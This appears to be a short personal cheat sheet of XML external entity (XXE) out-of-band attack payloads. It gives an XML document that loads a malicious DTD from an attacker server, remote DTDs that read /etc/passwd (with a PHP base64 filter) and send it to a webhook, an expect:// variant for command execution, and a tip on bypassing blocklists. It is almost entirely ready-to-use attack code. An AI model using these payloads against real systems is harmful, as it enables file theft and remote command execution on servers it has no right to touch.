**Initial XXE OOB to load remote one**

**useful for bypassing blocklists such as "SYSTEM" can also do encoding shenanigans**

```xml
<?xml version='1.0'?>

<!DOCTYPE data [
  <!ENTITY % ext_dtd PUBLIC "" "https://ATTACKER_SERVER/malicious.dtd">
  %ext_dtd;
  %exfil;
]>

<users>
    <user>
        <username>dededededededededededededede&exfil;</username>
        <password>lol</password>
        <name>Alexandra</name>
        <email>alex@astromine.com</email>  
        <company>Astromine</company>
        <isAdmin>1</isAdmin>
    </user>
```

**The Remote Malicious.dtd**
```xml
<!ENTITY % internal_dtd SYSTEM "http://10.32.78.218/oiaeurgbaowe/evil.dtd">
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'https://WEBHOOKURL HERE/?data=%file;'>">
%param3;

```
**PHP Base64 encoded output of the file in case the server is choking from special characters**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'https://WEBHOOK URL /?data=%file;'>">
%param3;
```

**For RCE**
```xml
<!ENTITY % file SYSTEM "expect://ls ">
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'https://WEBHOOK URL HERE/?data=%file;'>">
%param3;

```
